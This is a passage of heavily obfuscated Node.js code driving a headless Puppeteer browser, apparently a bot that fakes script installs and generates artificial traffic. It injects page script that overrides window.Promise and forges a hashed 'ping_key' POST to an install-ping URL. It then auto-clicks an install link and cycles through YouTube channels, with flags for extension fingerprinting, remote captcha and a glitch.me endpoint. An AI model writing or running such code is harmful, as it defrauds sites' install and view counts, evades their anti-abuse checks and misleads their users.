                return this['bytes'] > -0x1f7eb865b * 0x1 + -0x215 * -0x8c94d3 + 0x1d339ab0b && (this['hBytes'] += this['bytes'] / (-0x18 * -0xe177b9c + 0x142c1dad * 0x14 + -0x1e5a5e824) << -0x135 * 0x1f + -0x4 * 0x47e + 0x3763 * 0x1, this['bytes'] = this['bytes'] % (-0x19a804 * 0x4b4 + -0x8e8fb3a8 + -0x81ce799e * -0x4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x15ed + -0x7 * 0x1df + 0x2307;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x33b * 0x1 + -0xaa9 * 0x1 + -0x37d * -0x4] = this['block'], J[K >> 0x149c * 0x1 + 0x1 * 0xffd + 0x227 * -0x11] |= x[0x7c * 0x2b + 0xa8e + -0x1f5f & K], this['block'] = J[-0x1e1 * -0x6 + 0x23ba + -0x8 * 0x5de], K >= 0x2269 + -0x1 * 0x60c + -0x1c25 && (this['hashed'] || this['hash'](), J[-0x1 * -0xded + -0x1 * -0x4e5 + -0xb * 0x1b6] = this['block'], J[0x1764 + -0x32 * -0x47 + -0x2532] = J[-0x244e + 0x2c1 * 0xd + 0x2 * 0x41] = J[-0x7f * -0x16 + 0x1dbd + -0x28a5] = J[-0x1cd7 + -0xbb7 + 0x2891] = J[0x5 * 0x5ae + 0x5 * -0x373 + -0xb23 * 0x1] = J[-0x20a8 + 0xf7c + 0x3 * 0x5bb] = J[0x4 * 0x7f1 + 0x611 * -0x3 + -0x1 * 0xd8b] = J[0x166e + -0x6a7 + -0xfc0] = J[-0x6e * -0x2b + -0x25fc * -0x1 + -0xe9 * 0x3e] = J[0xba2 + 0x1982 + -0x251b] = J[-0x2566 * -0x1 + 0xb17 * 0x1 + -0x1 * 0x3073] = J[0x1821 + -0x94 * -0x2b + -0x30f2] = J[-0xcf * 0x1 + -0x260b + 0x1a * 0x17f] = J[-0x2 * -0x1a6 + -0x1367 * -0x1 + 0x1a * -0xdf] = J[-0x98a + -0x378 + 0xd10] = J[0x528 + 0x78d * -0x5 + -0x16 * -0x17c] = -0xeda + -0x243 * -0x1 + 0xc97), J[0x3 * 0x297 + 0x1761 + -0x638 * 0x5] = this['hBytes'] << -0x1ab9 + -0x2167 + -0x1 * -0x3c23 | this['bytes'] >>> -0x64d + 0xeb9 * 0x1 + -0x84f * 0x1, J[-0xc0d + 0x1355 + 0x1 * -0x739] = this['bytes'] << -0x664 + 0x11 * 0x173 + -0x123c, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x5 * 0x335 + -0x1928 + 0x92f; J < 0x1533 + 0x1db1 + 0x86e * -0x6; ++J)
                K = Q[J - (-0x18bc + -0x17 * -0xbd + 0x7c4)] ^ Q[J - (0x20b9 * 0x1 + 0x181d + -0x2 * 0x1c67)] ^ Q[J - (-0x1 * -0x7cf + 0x1c98 + 0x745 * -0x5)] ^ Q[J - (-0xd94 + -0x8 * 0x445 + 0x2fcc)], Q[J] = K << 0x1b5e + -0x1561 * -0x1 + -0x30be | K >>> -0x16db + 0x96b + 0xd8f;
              for (J = 0x2 * 0x5ce + 0x1877 + 0x1 * -0x2413; J < -0x1647 + 0x7bd * -0x4 + 0x354f; J += 0x1b6d + 0x1341 * -0x1 + -0x827)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e58 + -0x1 * -0x39a + -0x1f * -0xdd | L >>> 0x2568 + -0x1 * -0x1b64 + -0x40b1) + (M & N | ~M & O) + P + (0x3 * 0x280c410e + -0x89e19f58 + 0x2ecf47b * 0x25) + Q[J] << -0xd * -0xb8 + -0x2 * -0x767 + 0x232 * -0xb) << -0x1 * -0x2590 + 0x1018 + -0x35a3 | P >>> 0x153e + -0x7c7 * 0x2 + -0x595) + (L & (M = M << -0xcfb + -0x1 * 0x26b0 + 0x1 * 0x33c9 | M >>> -0xadc + 0x32a + 0x3da * 0x2) | ~L & N) + O + (-0x31ca025c + 0x6999cd13 + -0x37c1a * -0x9f5) + Q[J + (0x215 * -0x1 + 0xbaf + -0x999)] << -0x17b9 + -0x1 * 0x15e6 + -0x2d9f * -0x1) << -0x477 + -0x1 * -0xf89 + -0x3 * 0x3af | O >>> -0x5e1 * -0x1 + -0x2 * -0x9d9 + -0x1978) + (P & (L = L << 0x1291 + -0x6 * -0x47d + -0x2d61 | L >>> -0x1 * -0x13b5 + -0x151 * -0x4 + 0x18f7 * -0x1) | ~P & M) + N + (-0x29be984c + -0x62ff2a70 + 0xe7403c55) + Q[J + (0x200a + -0x261a + 0x612)] << -0x148c + -0x184d * 0x1 + 0x2cd9) << -0x29 * 0x35 + -0x1b8d + 0x240f | N >>> 0x19bb + 0x2455 + 0x11 * -0x3a5) + (O & (P = P << -0x1669 + 0x65 * -0x1b + 0x212e | P >>> -0x243e + 0x224d + 0x1f3 * 0x1) | ~O & L) + M + (-0x1bec14f7 + 0x17b4a5 * 0x526 + 0x1 * -0x39d7aee) + Q[J + (-0x658 + 0x20c6 + -0x1 * 0x1a6b)] << -0x39 * -0xd + 0x1744 + 0x1 * -0x1a29) << 0x3b5 + -0x1b94 + 0x2c * 0x8b | M >>> -0x24fa + 0x1 * 0x89b + 0x6 * 0x4bf) + (N & (O = O << 0x5 * 0x260 + 0x2624 + -0x31e6 * 0x1 | O >>> 0x6cb + -0xb8 * -0x17 + 0x7f * -0x2f) | ~N & P) + L + (-0x1 * -0x2d2ef229 + -0x1 * -0x925769a5 + -0x5b * 0x11c2caf) + Q[J + (0x322 + -0x1 * 0xf90 + 0xc72 * 0x1)] << 0x1 * 0x1a62 + -0x11d4 + -0x88e, N = N << 0x628 + -0xa8 + -0x562 | N >>> -0xe11 * 0x1 + 0x71 * -0x15 + 0x1758;
              for (; J < 0x1496 + -0xed4 + 0x1de * -0x3; J += -0x1 * -0x701 + 0x182c + 0x2 * -0xf94)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1dfb + 0x1b * -0xcb + -0x1123 * -0x3 | L >>> -0xe3 * -0xb + 0x4 * 0x448 + -0x1ac6) + (M ^ N ^ O) + P + (-0x48 * 0x1909b83 + -0x254e2fc + -0x2f1 * -0x4cc8c5) + Q[J] << 0xa93 * 0x1 + -0x9c8 + -0xcb) << -0x13 * -0x1a4 + 0x1 * 0x197d + -0x19 * 0x244 | P >>> 0xcfc + 0x8f2 * 0x1 + -0x15d3) + (L ^ (M = M << 0x2d7 * 0xd + 0x1821 + -0x2c5 * 0x16 | M >>> 0x908 + -0xc * -0x1f9 + 0xf * -0x22e) ^ N) + O + (-0xc669731c + -0xe6a4885 * -0x2 + -0x3 * -0x5d7a4491) + Q[J + (-0x225d + -0x1 * -0xef + -0xb25 * -0x3)] << -0x11 * 0x163 + 0x13df + 0x3b4) << -0x1 * -0xdde + 0x143 * -0x15 + 0x653 * 0x2 | O >>> 0x12e + 0xcd6 + 0x4a3 * -0x3) + (P ^ (L = L << -0xd * 0x37 + 0x5f3 + 0x2 * -0x185 | L >>> 0x4d * 0x73 + -0x1 * -0x1e07 + -0x409c) ^ M) + N + (-0xd24b2daa + -0xace60460 + 0x1ee0b1dab) + Q[J + (-0x1b93 + 0x923 * -0x2 + -0x27 * -0x12d)] << 0x9fc + 0x347 * -0x4 + -0x28 * -0x14) << 0x626 * 0x2 + 0x1 * 0x255d + -0x31a4 | N >>> -0x65e * 0x5 + 0xd1 * -0x21 + -0x3ae2 * -0x1) + (O ^ (P = P << -0x1 * 0x12c3 + -0xa1d + 0x2 * 0xe7f | P >>> -0x2 * -0x1ca + -0x751 * -0x1 + 0x3 * -0x3a1) ^ L) + M + (0x2aee5779 + 0x487ff70b + 0x60d9 * -0xc1b) + Q[J + (-0x1f52 + -0x151a + -0x1 * -0x346f)] << 0xe49 + -0x5d * 0x7 + -0xbbe) << -0x3 * 0x5 + -0x1511 + 0x1525 * 0x1 | M >>> 0x62 * 0x42 + -0x5 * 0x100 + -0x1429) + (N ^ (O = O << -0x1903 * -0x1 + -0x1344 + 0x1 * -0x5a1 | O >>> -0x1c25 + -0x1976 + 0x359d) ^ P) + L + (0x60c699 * -0x76 + 0xda62603c + 0xcb6d7 * -0x4f3) + Q[J + (-0x40f * -0x9 + 0x4d0 + -0x47 * 0x95)] << 0x267c + 0x26ae + -0x4d2a, N = N << 0x184a + 0x2 * -0xf49 + 0x666 * 0x1 | N >>> -0x69f + 0x1902 + -0x3ad * 0x5;
              for (; J < 0x674 + -0x44e + 0xe * -0x23; J += 0x12 * -0x1be + -0x958 + 0x1 * 0x28b9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * 0xb8b + 0xcf9 + 0x15ad | L >>> 0x237f + 0xdc7 + -0x312b) + (M & N | M & O | N & O) + P - (-0x8c73e276 + -0x2 * 0x29759aa9 + 0x3 * 0x701673a4) + Q[J] << -0x2dd + -0x239 * -0x2 + 0x87 * -0x3) << 0x47e + -0x260b + -0x2 * -0x10c9 | P >>> 0xa4 + 0x179f + 0xc14 * -0x2) + (L & (M = M << -0x2b * -0x48 + 0x32a + -0xc * 0x143 | M >>> 0x47 * -0x43 + 0x1e44 + -0xbad) | L & N | M & N) + O - (0x17cede4e + 0xaa53b80f + 0x513e5339 * -0x1) + Q[J + (-0x16 * 0x129 + -0x1 * 0x1dd7 + 0x1 * 0x375e)] << -0x2345 + 0x77b * 0x5 + 0x1a * -0x15) << 0x1dc * 0x1 + -0x1b4c + -0x7 * -0x3a3 | O >>> -0x48d * -0x4 + -0x1eb9 + 0xca0) + (P & (L = L << -0x136e + 0x1c1 * -0x1 + -0x1 * -0x154d | L >>> 0x45b + 0x263 + -0x1 * 0x6bc) | P & M | L & M) + N - (-0x4393e31b + 0x1f4efbe7 * -0x1 + 0xd3c72226) + Q[J + (0x21be + -0x18eb * -0x1 + -0x7 * 0x861)] << 0x735 + -0x13 * -0xae + 0x3 * -0x6b5) << 0x238e + -0x17ff * 0x1 + 0xd3 * -0xe | N >>> -0x806 + 0x389 + 0x38 * 0x15) + (O & (P = P << 0x1672 + -0x125c + -0x3f8 | P >>> 0x24ec + 0x2 * 0x1e7 + -0x28b8) | O & L | P & L) + M - (-0x8fa4d82f + -0x1489337e + 0x115124ed1) + Q[J + (0x4 * 0x9c + -0x59f + 0x332)] << 0x1dd7 + -0x1f02 + 0x12b) << -0x3 * 0x38a + 0x18f0 + 0xe4d * -0x1 | M >>> -0x948 + -0xa72 + 0x13d5 * 0x1) + (N & (O = O << -0x184c + -0x4 * -0xb0 + 0x15aa | O >>> -0x9 * 0x17f + -0xa * -0x179 + -0x141) | N & P | O & P) + L - (0x240d2 * -0x1295 + -0xc5aa0d6 + 0xa71d6234) + Q[J + (-0x35 * -0x65 + 0x80a + -0x1cef * 0x1)] << -0x1077 + 0x14ed + -0x2 * 0x23b, N = N << 0x1045 + -0x2 * 0xe3 + -0xe61 * 0x1 | N >>> 0x29f + -0x118 * -0xf + -0x657 * 0x3;
              for (; J < -0x54c + 0x1cce + -0x1732; J += 0x14b9 + -0x1722 + -0x2 * -0x137)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1ec7 + 0x20b1 * -0x1 + -0x37 * -0x9 | L >>> 0xc4e + -0x18d * -0x19 + 0xe9 * -0x38) + (M ^ N ^ O) + P - (-0x1 * -0x41d0597f + 0x26 * 0x2c60ab3 + 0x470f * -0x1a7a9) + Q[J] << -0xb6c + 0x71 * -0x12 + -0x1 * -0x135e) << -0x2 * 0x607 + -0x2014 + 0x2c27 | P >>> 0x52b + 0x1ee9 + -0x23f9 * 0x1) + (L ^ (M = M << 0x1 * -0x1bce + -0x1 * 0x1ef7 + 0x3ae3 | M >>> -0x101f * 0x2 + 0x4 * -0x71d + 0x3cb4) ^ N) + O - (0x68920e6d + -0x17799237 + 0x4 * -0x6decf83) + Q[J + (-0x1a49 + 0x3 * -0xc06 + 0x3e5c)] << 0x57 * 0x6f + 0xfb5 + 0x7a2 * -0x7) << 0x2025 + 0xcb3 + -0x2cd3 | O >>> -0xc * 0x281 + 0x1 * 0x1aab + 0x37c) + (P ^ (L = L << -0x473 + -0x116e + 0x15ff | L >>> 0xf07 * 0x1 + 0xfe9 + -0x1eee) ^ M) + N - (0x1 * -0x232c50d0 + 0x108512d4 + 0x48447c26) + Q[J + (-0x1e51 * -0x1 + 0x547 * 0x1 + -0x71e * 0x5)] << 0x13 * -0x1b7 + -0x253b + 0x45d0) << 0x9 * -0x1f5 + -0x1a1 * -0xc + -0x1ea | N >>> -0x1fbb * -0x1 + 0x1b7 + 0x1 * -0x2157) + (O ^ (P = P << -0x1673 * -0x1 + -0x52a * -0x6 + -0x3551 | P >>> -0x1 * 0x66a + 0x1e2f + 0x7 * -0x365) ^ L) + M - (0x3dbf2 * 0x1ac6 + 0x6af3822b + -0x9ca8f52d) + Q[J + (-0x24cc + -0x1699 + -0x1db4 * -0x2)] << -0x1604 + 0x23f + 0x13c5 * 0x1) << 0x253 + -0xeb5 + -0xc67 * -0x1 | M >>> -0x1506 + 0xd05 * -0x2 + -0xfb9 * -0x3) + (N ^ (O = O << 0x4 * -0x8a5 + 0xf * 0x26 + 0x103c * 0x2 | O >>> -0x1839 + 0x237 * 0x6 + -0xaf1 * -0x1) ^ P) + L - (-0x5 * 0x9207cd1 + -0xbcdf653 * -0x2 + -0x1 * -0x4ba3c199) + Q[J + (0x1627 + 0x2506 + 0x5 * -0xbd5)] << -0x6 * -0x1c + 0x8ed + -0xb * 0xdf, N = N << 0x379 * -0x1 + 0x1 * -0x1e07 + 0x219e | N >>> 0x1b78 + -0x1ed0 + -0x1ad * -0x2;
              this['h0'] = this['h0'] + L << 0x1 * -0xf86 + 0x12c3 + -0x33d, this['h1'] = this['h1'] + M << 0x53c + -0x39 + -0x503, this['h2'] = this['h2'] + N << -0x1a2b + -0x1648 * -0x1 + 0x3e3, this['h3'] = this['h3'] + O << -0x9 * -0x27b + -0x17b * 0xb + -0x60a, this['h4'] = this['h4'] + P << -0x1369 + 0x3 * 0x9dc + -0xa2b;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1b86 + -0x1133 + -0xa37 & 0x7 * 0x197 + 0x1d * -0x115 + -0x3 * -0x6c5] + w[J >> -0x2625 + 0x14 * 0x12d + 0xeb9 & 0x13 * 0x31 + 0x1 * -0x516 + 0x182] + w[J >> 0x1eae + 0x2ff * 0xd + -0x458d & -0x9a9 * 0x2 + 0xb5 + 0x2 * 0x956] + w[J >> 0x24b5 + 0x22aa + 0x5 * -0xe43 & 0x2e * 0x4a + -0x157e + 0x841] + w[J >> -0x1229 + -0x1a38 * 0x1 + 0x2c6d & 0x2 * -0x11ae + -0xbdb + 0x2f46] + w[J >> 0x2503 + 0x7e * 0x3 + -0x2675 & 0x1f * -0xe2 + -0x2377 * -0x1 + -0x80a] + w[J >> -0x1a1 * 0x1 + -0xfa7 * -0x2 + -0x9e3 * 0x3 & -0x127a + -0x1259 + -0x24e2 * -0x1] + w[0x1 * 0x1b65 + -0x20f0 + 0x59a & J] + w[K >> -0x1a36 + 0x7f9 * -0x3 + 0x3 * 0x10bf & 0x2 * 0x871 + 0x1ffc + -0x30cf] + w[K >> -0x42c * -0x8 + 0x2361 + 0x1b * -0x28b & 0x489 + 0x24f2 + -0x296c] + w[K >> 0x826 * -0x1 + 0xfb * 0x25 + -0x1c0d & -0xf3b + -0x19 * -0xf4 + -0x88a] + w[K >> 0x560 + 0x1d13 + -0x1 * 0x2263 & 0x12ff + -0x1 * 0x2132 + 0x49 * 0x32] + w[K >> -0x1 * -0x1114 + -0x3 * -0x15b + -0x1519 & -0x1cfc + -0x988 + -0x7d * -0x4f] + w[K >> -0x1 * -0xf75 + 0x377 * -0x9 + -0x1 * -0xfc2 & 0x1 * -0x1467 + 0xef0 + 0x586] + w[K >> -0x18ad + 0xa1 * -0x23 + 0xe * 0x356 & 0xe * 0x26a + 0x8db * -0x4 + -0x1af * -0x1] + w[0x235f + 0x1a * 0x65 + -0x2d92 & K] + w[L >> -0x1cb3 + -0x13 * -0x143 + -0x4d6 * -0x1 & -0x157a + 0x1140 + 0x449] + w[L >> 0x80 * 0x11 + 0x407 * -0x7 + 0x13c9 & -0xb * 0x165 + -0x8 * -0x102 + 0x756] + w[L >> -0x1 * -0x12dd + -0x20ba + 0xdf1 & 0x1d35 + -0x1 * 0x242 + -0x1ae4] + w[L >> 0x256b + 0x629 * 0x1 + -0x2b84 & 0x3 * -0x4cf + 0x1 * -0x1073 + 0x1eef] + w[L >> -0xfcf + -0x6f9 * 0x4 + 0x3 * 0xe95 & 0x14ad + 0x9 * -0x425 + -0x10af * -0x1] + w[L >> 0x33 * -0x1 + -0x1c63 + 0x1c9e & 0x91a + -0x2400 + 0x1af5] + w[L >> -0xdc0 + 0xd * 0x26f + 0x393 * -0x5 & -0x1b2b * 0x1 + 0x655 * 0x5 + -0x46f * 0x1] + w[0x23cd + 0x1967 * 0x1 + -0x3d25 * 0x1 & L] + w[M >> 0x2122 + -0x2059 + -0xad & 0xda6 + -0x7f * 0x5 + -0xb1c] + w[M >> -0x1 * 0x26f + -0x1 * 0x1602 + -0x1889 * -0x1 & -0xbd * -0x1e + -0x1e1f + 0x808] + w[M >> -0x8b * 0x36 + 0x1d76 + -0x10 & 0x1 * 0x26a9 + 0x3 * 0x827 + -0x3f0f] + w[M >> 0xe9f + 0x1aa + -0x1039 * 0x1 & -0x16 * -0x12d + 0x1764 + -0x9d7 * 0x5] + w[M >> 0x2e * 0x8e + -0x511 * -0x2 + -0x239a & 0x1775 + 0xfd0 + -0x2736] + w[M >> -0xd * -0x18c + 0x1454 + -0x2868 & 0x1d75 + -0x1 * 0x2345 + 0x5df] + w[M >> 0x1dd9 + -0x20a9 + 0x2d4 & 0x2 * -0x63a + -0x20a5 + 0x2d28] + w[-0xb39 * 0x1 + 0x31 * 0x13 + -0x7a5 * -0x1 & M] + w[N >> 0x167d + -0xb * 0x289 + 0x582 & -0x68b + -0x1 * -0x1e36 + -0xbce * 0x2] + w[N >> -0x5b * 0x2b + -0x62f * -0x3 + 0x3a * -0xe & 0x1 * 0x2246 + -0x5d4 * 0x1 + 0x1c63 * -0x1] + w[N >> -0xce5 * 0x2 + 0x1bc7 * -0x1 + -0x1bb * -0x1f & -0x9c5 + -0x1 * 0x832 + 0x3 * 0x602] + w[N >> -0x2eb * -0x1 + -0x780 + 0x4a5 & -0x7c * -0x8 + -0x445 * -0x1 + -0x816] + w[N >> 0x2318 + -0x1de8 + -0x524 & -0x5 * 0x3d + 0x3b * 0x4d + -0x107f] + w[N >> 0x43 * 0x8 + 0x2 * 0xcf2 + 0x4 * -0x6fd & -0x1ef3 + 0x2b * -0xc7 + 0x406f * 0x1] + w[N >> -0x1ae9 * -0x1 + -0x171e + 0x3c7 * -0x1 & -0x16e * -0x1 + 0x1a1c + 0x929 * -0x3] + w[-0xb9a + 0x24d2 + 0x39 * -0x71 & N];
            }
            [V(0x0)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x8dd + -0xa1d + 0x158 & 0x25ac * 0x1 + -0x24e9 + -0x3c * -0x1,
                J >> 0x17e4 + -0x5a4 * -0x4 + -0x2 * 0x1732 & 0x61f + -0x13d * 0xa + -0x3a1 * -0x2,
                J >> -0x1 * 0x1363 + 0x1 * -0xce5 + 0x2050 & 0xb25 + 0x1449 + 0x7 * -0x459,
                0x1f24 + -0x14 * -0x1 + -0x1e39 & J,
                K >> -0x1967 + 0xc5b + 0x4 * 0x349 & 0x18c0 + 0x423 * -0x3 + -0x42 * 0x2c,
                K >> -0x2086 + 0x166d + 0xa29 & 0x13d * 0x1 + 0x18a3 + -0xb * 0x243,
                K >> -0x169 * 0x13 + 0x1abd + 0x16 * 0x1 & 0x160e + 0x10a * 0x1d + -0x3331,
                0x15ca * 0x1 + -0x217f + 0xcb4 & K,
                L >> -0x21b4 + 0x595 * -0x1 + -0x251 * -0x11 & 0x1 * -0x1195 + -0xc5 * -0x24 + -0x2 * 0x490,
                L >> 0x2627 * -0x1 + 0x42 * -0x15 + 0x2ba1 & 0x24f5 + 0x1d + -0x2413,
                L >> -0xb20 + 0x164 * -0x10 + -0x1 * -0x2168 & -0xa92 + 0x2521 + 0xcc8 * -0x2,
                -0x19ae + -0x35 * -0x35 + -0x1e * -0x86 & L,
                M >> -0x14c0 + 0x285 + 0x1253 & -0xc20 * -0x2 + -0x991 + -0xdb0,
                M >> 0x1aa6 + 0xf7e + 0xa85 * -0x4 & 0x21fc + -0x16 * 0xd4 + -0xec5,
                M >> 0x2340 + -0x1 * -0x2671 + 0x1 * -0x49a9 & 0x1 * -0x1b77 + -0x14 + 0x2 * 0xe45,
                0x46c + -0x218e + 0x1e21 & M,
                N >> -0x4 * -0x8a2 + 0x17d5 + -0x3a45 & 0x1d6e + -0x12d * 0x2 + -0x1 * 0x1a15,
                N >> 0x19e0 + -0x1589 * -0x1 + -0x2f59 & 0x9 * 0x16a + 0x132f + -0x3 * 0xa4e,
                N >> 0xe1e + -0x1 * 0xdf4 + -0x22 & 0x1dcf * -0x1 + -0x4bb * 0x3 + 0x2cff,
                0x1c * -0xa3 + 0xaaf * 0x1 + 0x824 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xe6c + 0x2194 + -0x2fec), (K = new DataView(J))['setUint32'](0xeda + -0x11dc + -0x181 * -0x2, this['h0']), K['setUint32'](0xaf7 + -0xeba + -0x3c7 * -0x1, this['h1']), K['setUint32'](-0x35f * -0x6 + -0x20d5 * 0x1 + -0xca3 * -0x1, this['h2']), K['setUint32'](0x68c + 0x539 + 0x1 * -0xbb9, this['h3']), K['setUint32'](-0x2693 + 0x1ccb + -0x48 * -0x23, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1 * 0xbb9 + 0x121 + 0x1c4 * 0x6];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1905 + 0x1d * -0xe3 + 0xb2;
            J[-0x1b29 + -0x218c + -0x1 * -0x3cb5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x894 + 0x2437 + -0x2ccb] = L => {
              const W = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I[W(0xe) + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x8f * -0x3 + -0x1be9 + 0x1a3d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x270a + 0x2b * -0xb3 + -0x451c * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1c1b * 0x1 + -0xa * 0x200 + 0x35f7), Promise['resolve'](0x14 * 0x7f + 0x1 * -0x2a4 + 0x1b * -0x45);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2205 * -0x1 + -0xd2b * -0x2 + -0x1 * 0x3c5b; j < -0x173a + 0x11 * 0x7f + 0xecc; j++)
    i();
}
const NETWORK_PATIENCE = -0x7 * -0xc1 + -0x2122 + 0x3b1b * 0x1 + (-0x1591 + 0x2 * 0x1241 + -0x339) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x9c + -0xba * 0x30 + -0x5 * -0x6db) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x2374 + -0x65e + -0x1d16);
    let h = e[f];
    if (c['ANGQnl'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x18f1 + 0x69d * 0x3 + 0x2cc8 * -0x1, r, s, t = -0x15b8 + -0x9a6 + 0x1f5e; s = m['charAt'](t++); ~s && (r = q % (0x531 * 0x7 + 0x2110 + 0x1721 * -0x3) ? r * (-0x244 * 0x1 + -0x1 * -0x23ba + 0x147 * -0x1a) + s : s, q++ % (0x19ba + -0x517 * 0x4 + 0x5 * -0x112)) ? o += String['fromCharCode'](0x5 * 0x6cf + -0xaf9 + -0x1613 * 0x1 & r >> (-(0xd13 * -0x2 + -0x6 * -0x3f6 + -0x3 * -0xcc) * q & 0xcd * 0x2f + -0x193b + -0x1 * 0xc62)) : 0x32 * -0x25 + -0x1ac7 + 0x2201) {
          s = n['indexOf'](s);
        }
        for (let u = -0x20cf + 0x28 * 0x7 + 0x1fb7 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x585 + 0x6d6 + -0x141 * 0x1))['slice'](-(0x91 * 0x3e + 0xd74 + -0x3090));
        }
        return decodeURIComponent(p);
      };
      c['GKpORO'] = i, b = arguments, c['ANGQnl'] = !![];
    }
    const j = e[-0xedb * -0x2 + -0x255d + -0x3 * -0x28d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['GKpORO'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x5 * -0x7bb + -0x20e2 + -0x5c5; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
